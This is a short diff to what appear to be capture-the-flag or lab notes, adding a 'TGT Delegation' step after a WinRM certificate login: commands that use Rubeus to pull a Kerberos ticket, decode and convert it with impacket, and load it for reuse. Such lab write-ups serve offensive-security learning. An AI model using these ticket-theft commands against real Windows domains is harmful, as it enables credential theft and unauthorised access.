@@ -35,3 +35,14 @@ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem
 
 evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
 ```
+
+## TGT Delegation
+```
+.\Rubeus.exe tgtdeleg /nowrap
+
+nano svc_sql.kirbi.b64
+cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi
+
+impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
+export KRB5CCNAME=svc_sql.ccache
+```
